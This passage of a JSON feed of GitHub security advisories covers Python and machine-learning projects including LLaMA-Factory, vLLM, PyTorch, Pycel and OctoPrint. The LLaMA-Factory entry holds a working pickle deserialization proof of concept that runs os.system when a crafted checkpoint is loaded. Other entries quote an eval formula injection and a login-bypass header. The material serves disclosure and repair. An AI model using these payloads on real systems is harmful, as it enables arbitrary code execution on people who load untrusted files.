malicious project folder containing a crafted <code>.bin</code> file (e.g. via zip file, GitHub repo).</li>\n<li>Running the provided conversion script <code>llamafy_baichuan2.py</code>, either manually or as part of an example workflow.</li>\n</ol>\n<p>No elevated privileges are required. The user only needs to run the script with an attacker-supplied <code>--input_dir</code>. </p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>Arbitrary command execution (RCE)</li>\n<li>System compromise</li>\n<li>Persistence or lateral movement in shared compute environments</li>\n</ul>\n<h3 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h3>\n<pre><code class=\"language-python\"># malicious_payload.py\nimport torch, pickle, os\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        return (os.system, (\"mkdir HACKED!\",))  # Arbitrary command\n\nmalicious_data = {\n    \"v_head.summary.weight\": MaliciousPayload(),\n    \"v_head.summary.bias\": torch.randn(10)\n}\n\nwith open(\"value_head.bin\", \"wb\") as f:\n    pickle.dump(malicious_data, f)\n</code></pre>\n<p>An example of <code>config.json</code>:</p>\n<pre><code class=\"language-json\">{\n  \"model\": \"value_head.bin\",\n  \"hidden_size\": 4096,\n  \"num_attention_heads\": 32,\n  \"num_hidden_layers\": 24,\n  \"initializer_range\": 0.02,\n  \"intermediate_size\": 11008,\n  \"max_position_embeddings\": 4096,\n  \"kv_channels\": 128,\n  \"layer_norm_epsilon\": 1e-5,\n  \"tie_word_embeddings\": false,\n  \"vocab_size\": 151936\n}\n</code></pre>\n<pre><code class=\"language-bash\">(base) root@d6ab70067470:~/LLaMA-Factory_latest# tree\n.\n`-- LLaMA-Factory\n    |-- LICENSE\n    |-- README.md\n    |-- malicious_folder\n    |   |-- config.json\n    |   `-- value_head.bin\n    `-- xxxxx(Irrelevant documents omitted)\n</code></pre>\n<pre><code class=\"language-bash\"># Reproduction\npython scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out\n</code></pre>\n<p>➡️ Running this will execute the malicious payload and create a <code>HACKED!</code> folder.</p>\n<pre><code class=\"language-bash\">(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls\nCITATION.cff  LICENSE  MANIFEST.in  Makefile  README.md  README_zh.md  assets  data  docker  evaluation  examples  malicious_folder  pyproject.toml  requirements.txt  scripts  setup.py  src  tests\n(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out\n2025-04-23 07:36:58.435304: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\nWARNING: All log messages before absl::InitializeLog() is called are written to STDERR\nE0000 00:00:1745393818.451398    1008 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\nE0000 00:00:1745393818.456423    1008 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n2025-04-23 07:36:58.472951: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\nTo enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\nLoad weights:  50%|██████████████████████████████████████████████████████████████████████████████████▌                                                                                  | 1/2 [00:00&lt;00:00, 123.70it/s]\nTraceback (most recent call last):\n  File \"/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py\", line 112, in &lt;module&gt;\n    fire.Fire(llamafy_baichuan2)\n  File \"/root/miniconda3/lib/python3.12/site-packages/fire/core.py\", line 135, in Fire\n    component_trace = _Fire(component, args, parsed_flag_args, context, name)\n                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/fire/core.py\", line 468, in _Fire\n    component, remaining_args = _CallAndUpdateTrace(\n                                ^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/fire/core.py\", line 684, in _CallAndUpdateTrace\n    component = fn(*varargs, **kwargs)\n                ^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py\", line 107, in llamafy_baichuan2\n    save_weight(input_dir, output_dir, shard_size, save_safetensors)\n  File \"/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py\", line 35, in save_weight\n    shard_weight = torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")\n                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py\", line 1040, in load\n    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py\", line 1260, in _legacy_load\n    raise RuntimeError(\"Invalid magic number; corrupt file?\")\nRuntimeError: Invalid magic number; corrupt file?\n(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls\n CITATION.cff   LICENSE       Makefile    README_zh.md   data     evaluation   malicious_folder   pyproject.toml     scripts    src\n'HACKED!'       MANIFEST.in   README.md   assets         docker   examples     out                requirements.txt   setup.py   tests\n</code></pre>\n<h3 id=\"affected-files\">Affected File(s)</h3>\n<ul>\n<li><a href=\"https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35\">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>\n<li><code>scripts/convert_ckpt/llamafy_baichuan2.py</code></li>\n<li>Line: <code>torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")</code></li>\n</ul>\n<h3 id=\"suggested-fix\">Suggested Fix</h3>\n<ul>\n<li>Replace <code>torch.load()</code> with safer alternatives like <code>safetensors</code>.</li>\n<li>Validate and whitelist file types before deserialization.</li>\n<li>Require checksum validation.</li>\n</ul>\n<p>Example patch:</p>\n<pre><code class=\"language-python\"># Replace torch.load() with safe deserialization\ntry:\n    from safetensors.torch import load_file\n    tensor_data = load_file(filepath)\nexcept Exception:\n    print(\"Invalid or unsafe checkpoint file.\")\n    return\n</code></pre>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Avoid running the script with untrusted <code>.bin</code> files.</li>\n<li>Use containers or VMs to isolate script execution.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://pytorch.org/docs/stable/generated/torch.load.html\">torch.load() — PyTorch Docs</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/502.html\">CWE-502: Deserialization of Untrusted Data</a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Discovered and reported by <a href=\"https://github.com/Anchor0221\">Yu Rong</a> and <a href=\"https://github.com/xhjy2020\">Hao Fan</a>, 2025-04-23</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv\">https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv</a></li>\n<li><a href=\"https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a\">https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a</a></li>\n<li><a href=\"https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35\">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f2f7-gj54-6vpv\">https://github.com/advisories/GHSA-f2f7-gj54-6vpv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f2f7-gj54-6vpv",
            "title": "[llamafactory] LLaMA-Factory Allows Arbitrary Code Execution via Unsafe Deserialization in Ilamafy_baichuan2.py",
            "date_modified": "2025-04-23T22:21:14.000Z",
            "date_published": "2025-04-23T22:21:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f2f7-gj54-6vpv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in InternLM LMDeploy up to 0.7.1. It has been declared as critical. Affected by this vulnerability is the function Open of the file lmdeploy/docs/en/conf.py. The manipulation leads to code injection. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3163\">https://nvd.nist.gov/vuln/detail/CVE-2025-3163</a></li>\n<li><a href=\"https://github.com/InternLM/lmdeploy/issues/3254\">https://github.com/InternLM/lmdeploy/issues/3254</a></li>\n<li><a href=\"https://github.com/InternLM/lmdeploy/issues/3254#issue-2918865448\">https://github.com/InternLM/lmdeploy/issues/3254#issue-2918865448</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.303109\">https://vuldb.com/?ctiid.303109</a></li>\n<li><a href=\"https://vuldb.com/?id.303109\">https://vuldb.com/?id.303109</a></li>\n<li><a href=\"https://vuldb.com/?submit.542527\">https://vuldb.com/?submit.542527</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jfvg-qm4p-473x\">https://github.com/advisories/GHSA-jfvg-qm4p-473x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jfvg-qm4p-473x",
            "title": "[lmdeploy] InternLM LMDeploy code injection vulnerability",
            "date_modified": "2025-04-23T19:37:40.000Z",
            "date_published": "2025-04-03T18:30:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jfvg-qm4p-473x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54\">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a> reported a vulnerability where loading a malicious model could result in code execution on the vllm host. The fix applied to specify <code>weights_only=True</code> to calls to <code>torch.load()</code> did not solve the problem prior to PyTorch 2.6.0.</p>\n<p>PyTorch has issued a new CVE about this problem: <a href=\"https://github.com/advisories/GHSA-53q9-r3pm-6pq6\">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></p>\n<p>This means that versions of vLLM using PyTorch before 2.6.0 are vulnerable to this problem.</p>\n<h2 id=\"background-knowledge\">Background Knowledge</h2>\n<p>When users install VLLM according to the official manual\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/d17e0bdb-26f2-46d6-adf6-0b17e5ddf5c7\"></p>\n<p>But the version of PyTorch is specified in the requirements. txt file\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/94aad622-ad6d-4741-b772-c342727c58c7\"></p>\n<p>So by default when the user install VLLM, it will install the PyTorch with version 2.5.1\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/04ff31b0-aad1-490a-963d-00fda91da47b\"></p>\n<p>In CVE-2025-24357, weights_only=True was used for patching, but we know this is not secure.\nBecause we found that using Weights_only=True in pyTorch before 2.5.1 was unsafe</p>\n<p>Here, we use this interface to prove that it is not safe.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/0d86efcd-2aad-42a2-8ac6-cc96b054c925\"></p>\n<h2 id=\"fix\">Fix</h2>\n<p>update PyTorch version to 2.6.0</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This vulnerability was found By Ji'an Zhou and Li'shuo Song</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6\">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw\">https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54\">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ggpf-24jw-3fcw\">https://github.com/advisories/GHSA-ggpf-24jw-3fcw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ggpf-24jw-3fcw",
            "title": "[vllm] CVE-2025-24357 Malicious model remote code execution fix bypass with PyTorch < 2.6.0",
            "date_modified": "2025-04-23T02:26:07.000Z",
            "date_published": "2025-04-23T02:26:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ggpf-24jw-3fcw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In OpenEXR 2.2.0, an invalid read of size 1 in the getBits function in ImfHuf.cpp could cause the application to crash.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-9112\">https://nvd.nist.gov/vuln/detail/CVE-2017-9112</a></li>\n<li><a href=\"https://github.com/openexr/openexr/issues/232\">https://github.com/openexr/openexr/issues/232</a></li>\n<li><a href=\"https://github.com/openexr/openexr/pull/233\">https://github.com/openexr/openexr/pull/233</a></li>\n<li><a href=\"https://github.com/openexr/openexr/releases/tag/v2.2.1\">https://github.com/openexr/openexr/releases/tag/v2.2.1</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html\">https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2017/05/12/5\">http://www.openwall.com/lists/oss-security/2017/05/12/5</a></li>\n<li><a href=\"https://usn.ubuntu.com/4148-1\">https://usn.ubuntu.com/4148-1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8m57-j273-2qg9\">https://github.com/advisories/GHSA-8m57-j273-2qg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8m57-j273-2qg9",
            "title": "[OpenEXR] OpenEXR invalid read",
            "date_modified": "2025-04-22T18:45:45.000Z",
            "date_published": "2022-05-13T01:17:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8m57-j273-2qg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In OpenEXR 2.2.0, an invalid write of size 8 in the storeSSE function in ImfOptimizedPixelReading.h could cause the application to crash or execute arbitrary code.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-9111\">https://nvd.nist.gov/vuln/detail/CVE-2017-9111</a></li>\n<li><a href=\"https://github.com/openexr/openexr/issues/232\">https://github.com/openexr/openexr/issues/232</a></li>\n<li><a href=\"https://github.com/openexr/openexr/pull/233\">https://github.com/openexr/openexr/pull/233</a></li>\n<li><a href=\"https://github.com/openexr/openexr/releases/tag/v2.2.1\">https://github.com/openexr/openexr/releases/tag/v2.2.1</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html\">https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html</a></li>\n<li><a href=\"https://www.debian.org/security/2020/dsa-4755\">https://www.debian.org/security/2020/dsa-4755</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html\">http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html\">http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2017/05/12/5\">http://www.openwall.com/lists/oss-security/2017/05/12/5</a></li>\n<li><a href=\"https://usn.ubuntu.com/4148-1\">https://usn.ubuntu.com/4148-1</a></li>\n<li><a href=\"https://usn.ubuntu.com/4339-1\">https://usn.ubuntu.com/4339-1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qxh9-r8xw-7v99\">https://github.com/advisories/GHSA-qxh9-r8xw-7v99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qxh9-r8xw-7v99",
            "title": "[OpenEXR] OpenEXR invalid write",
            "date_modified": "2025-04-22T18:45:30.000Z",
            "date_published": "2022-05-13T01:17:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qxh9-r8xw-7v99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Pycel through 1.0b30, when operating on an untrusted spreadsheet, allows code execution via a crafted formula in a cell, such as one beginning with the <code>=IF(A1=200, eval(\"__import__('os').system(</code> substring.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53924\">https://nvd.nist.gov/vuln/detail/CVE-2024-53924</a></li>\n<li><a href=\"https://gist.github.com/aelmosalamy/cb098e61939718d2bb248fd1cc94f287\">https://gist.github.com/aelmosalamy/cb098e61939718d2bb248fd1cc94f287</a></li>\n<li><a href=\"https://github.com/dgorissen/pycel\">https://github.com/dgorissen/pycel</a></li>\n<li><a href=\"https://github.com/stephenrauch/pycel\">https://github.com/stephenrauch/pycel</a></li>\n<li><a href=\"https://pypi.org/project/pycel\">https://pypi.org/project/pycel</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pw67-xjhq-389w\">https://github.com/advisories/GHSA-pw67-xjhq-389w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pw67-xjhq-389w",
            "title": "[pycel] Pycel allows code injection via a crafted formula",
            "date_modified": "2025-04-22T17:04:12.000Z",
            "date_published": "2025-04-17T18:31:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pw67-xjhq-389w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OctoPrint versions up until and including 1.10.3 contain a vulnerability that allows an attacker to bypass the login redirect and directly access the rendered HTML of certain frontend pages. </p>\n<p>The impact on data exposure is minimal because, typically, data is loaded via API requests that correctly enforce user authentication. In the current codebase, cases where data is directly embedded in the page content are rare. However, one notable exception is the authenticated variant of the reverse proxy test page, which displays the IP addresses of configured reverse proxies. </p>\n<p>The primary risk lies in potential future modifications to the codebase that might incorrectly rely on the vulnerable internal functions for authentication checks, leading to security vulnerabilities.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in version 1.11.0.</p>\n<h3 id=\"details\">Details</h3>\n<p>An authentication bypass vulnerability exists in the following functions defined in <a href=\"https://github.com/OctoPrint/OctoPrint/blob/d79a0d20f3f1c7f2edb56dedda3b70267a937e65/src/octoprint/server/util/__init__.py\">octoprint/server/util/init.py</a>:</p>\n<ul>\n<li><code>require_login</code></li>\n<li><code>require_login_with</code></li>\n<li><code>require_fresh_login_with</code></li>\n</ul>\n<p>By adding the HTTP header <code>X-Preemptive-Recording: yes</code> to HTTP requests, these functions allow requests to proceed without redirecting to the login screen, effectively bypassing the login mechanism in the frontend. However, this only grants access to frontend page content, while authenticated API endpoints still enforce proper session validation.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-qw93-h6pf-226x\">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-qw93-h6pf-226x</a></li>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/commit/41ff431014edfa18ca1a01897b10463934dc7fc2\">https://github.com/OctoPrint/OctoPrint/commit/41ff431014edfa18ca1a01897b10463934dc7fc2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32788\">https://nvd.nist.gov/vuln/detail/CVE-2025-32788</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw93-h6pf-226x\">https://github.com/advisories/GHSA-qw93-h6pf-226x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw93-h6pf-226x",
            "title": "[octoprint] OctoPrint Authenticated Reverse Proxy Page Authentication Bypass",
            "date_modified": "2025-04-23T15:20:11.000Z",
            "date_published": "2025-04-22T16:49:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw93-h6pf-226x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Web2py versions 2.14.5 and below was affected by Reflected XSS vulnerability, which allows an attacker to perform an XSS attack on logged in user (admin).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4807\">https://nvd.nist.gov/vuln/detail/CVE-2016-4807</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/137070/Web2py-2.14.5-CSRF-XSS-Local-File-Inclusion.html\">http://packetstormsecurity.com/files/137070/Web2py-2.14.5-CSRF-XSS-Local-File-Inclusion.html</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/39821\">https://www.exploit-db.com/exploits/39821</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pvcp-73cg-6f77\">https://github.com/advisories/GHSA-pvcp-73cg-6f77</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pvcp-73cg-6f77",
            "title": "[web2py] Web2py Reflected XSS vulnerability",
            "date_modified": "2025-04-21T22:52:17.000Z",
            "date_published": "2022-05-17T03:05:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pvcp-73cg-6f77"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Crawl4AI &lt;=0.4.247 is vulnerable to SSRF in /crawl4ai/async_dispatcher.py.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-28197\">https://nvd.nist.gov/vuln/detail/CVE-2025-28197</a></li>\n<li><a href=\"https://gist.github.com/AndrewDzzz/f49e79b09ce0643ee1fc2a829e8875e0\">https://gist.github.com/AndrewDzzz/f49e79b09ce0643ee1fc2a829e8875e0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-445m-27cf-gr3x\">https://github.com/advisories/GHSA-445m-27cf-gr3x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-445m-27cf-gr3x",
            "title": "[Crawl4AI] Crawl4AI SSRF vulnerability",
            "date_modified": "2025-04-21T21:54:26.000Z",
            "date_published": "2025-04-18T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-445m-27cf-gr3x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h4 id=\"description\">Description</h4>\n<p>This advisory follows the security advisory <a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j\">GHSA-79w7-vh3h-8g4j published by the <em>yt-dlp/yt-dlp</em> project</a> to aid remediation of the issue in the <em>ytdl-org/youtube-dl</em> project.</p>\n<h3 id=\"vulnerability\">Vulnerability</h3>\n<p><em>youtube-dl</em> does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Since <em>youtube-dl</em> also reads config from the working directory (and, on Windows, executables will be executed from the <em>youtube-dl</em> directory by default) the vulnerability could allow the unwanted execution of local code, including downloads masquerading as, eg, subtitles.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The versions of <em>youtube-dl</em> listed as <em>Patched</em> remediate this vulnerability by disallowing path separators and whitelisting allowed extensions. As a result, some very uncommon extensions might not get downloaded.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Any/all of the below considerations may limit exposure in case it is necessary to use a vulnerable version</p>\n<ul>\n<li>have <code>.%(ext)s</code> at the end of the output template</li>\n<li>download from websites that you trust</li>\n<li>do not download to a directory within the executable search <code>PATH</code> or other sensitive locations, such as your user directory or system directories</li>\n<li>in Windows versions that support it, set <a href=\"https://stackoverflow.com/a/50118548\"><code>NoDefaultCurrentDirectoryInExePath</code></a> to prevent the <em>cmd</em> shell's executable search adding the default directory before <code>PATH</code></li>\n<li>consider that the path traversal vulnerability as a result of resolving <code>non_existent_dir\\..\\..\\target</code> does not exist in Linux or macOS</li>\n<li>ensure the extension of the media to download is a common video/audio/... one (use <code>--get-filename</code>)</li>\n<li>omit any of the subtitle options (<code>--write-subs</code>/<code> --write-srt</code>, <code>--write-auto-subs</code>/<code>--write-automatic-subs</code>, <code>--all-subs</code>).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j\">GHSA-79w7-vh3h-8g4j</a></li>\n<li><a href=\"https://github.com/ytdl-org/youtube-dl/pull/32830\">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq\">https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j\">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38519\">https://nvd.nist.gov/vuln/detail/CVE-2024-38519</a></li>\n<li><a href=\"https://github.com/ytdl-org/youtube-dl/pull/32830\">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>\n<li><a href=\"https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec\">https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl\">https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22fp-mf44-f2mq\">https://github.com/advisories/GHSA-22fp-mf44-f2mq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22fp-mf44-f2mq",
            "title": "[youtube-dl] youtube-dl vulnerable to file system modification and RCE through improper file-extension sanitization",
            "date_modified": "2025-04-18T20:24:10.000Z",
            "date_published": "2025-04-18T20:24:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22fp-mf44-f2mq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"description\">Description</h1>\n<p>I found a Remote Command Execution (RCE) vulnerability in the PyTorch. When load model using torch.load with weights_only=True, it can still achieve RCE.  </p>\n<h1 id=\"background-knowledge\">Background knowledge</h1>\n<p><a href=\"https://github.com/pytorch/pytorch/security\">https://github.com/pytorch/pytorch/security</a> \n As you can see, the PyTorch official documentation considers using <code>torch.load()</code> with <code>weights_only=True</code> to be safe.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/fdaa8520-d66a-473a-ab1f-163d793de298\">\nSince everyone knows that weights_only=False is unsafe, so they will use the  weights_only=True to mitigate the security issue.\nBut now, I just proved that even if you use weights_only=True, it still can achieve RCE.\nSo it is time to update your PyTorch version~.</p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was found by Ji'an Zhou.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6\">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04\">https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32434\">https://nvd.nist.gov/vuln/detail/CVE-2025-32434</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-53q9-r3pm-6pq6\">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-53q9-r3pm-6pq6",
            "title": "[torch] PyTorch: `torch.load` with `weights_only=True` leads to remote code execution",
            "date_modified": "2025-04-18T18:34:25.000Z",
            "date_published": "2025-04-18T15:19:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-53q9-r3pm-6pq6"
            },
            "tags": [
                "severity"
            ]
        },
        {
